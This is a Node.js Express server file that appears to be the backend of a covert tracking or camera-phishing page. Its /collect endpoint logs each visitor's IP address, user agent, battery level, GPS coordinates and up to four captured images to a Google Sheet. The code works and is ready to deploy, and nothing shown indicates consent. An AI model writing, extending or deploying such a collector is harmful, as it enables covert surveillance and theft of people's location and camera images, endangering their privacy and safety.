import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import { google } from 'googleapis';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

app.use(cors());
app.use(express.json({ limit: '20mb' }));
app.use(express.static(__dirname));

// THIS IS THE CRITICAL FIX for the key format you sent
const formattedKey = (process.env.GOOGLE_PRIVATE_KEY || '')
  .split(String.raw`\n`).join('\n') // Handles literal \n
  .replace(/\\n/g, '\n')           // Handles escaped \n
  .trim();

const auth = new google.auth.JWT(
  process.env.GOOGLE_CLIENT_EMAIL,
  null,
  formattedKey,
  ['https://www.googleapis.com/auth/spreadsheets']
);

const sheets = google.sheets({ version: 'v4', auth });

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/collect', async (req, res) => {
    try {
        const { ts, hints, battery, location, burstImages } = req.body;
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

        const row = [
            ts, ip, hints?.ua || 'N/A', 
            (battery?.levelPercent || 0) + '%', 
            `${location?.lat || 0}, ${location?.lon || 0}`,
            burstImages?.[0] || '', burstImages?.[1] || '', 
            burstImages?.[2] || '', burstImages?.[3] || ''
        ];

        await sheets.spreadsheets.values.append({
            spreadsheetId: process.env.GOOGLE_SHEET_ID,
            range: 'Logs!A1',
            valueInputOption: 'RAW',
            requestBody: { values: [row] }
        });

        res.json({ ok: true });
    } catch (err) {
        console.error("SHEET ERROR:", err.message);
        res.status(500).json({ error: err.message });
    }
});

app.listen(process.env.PORT || 8080);
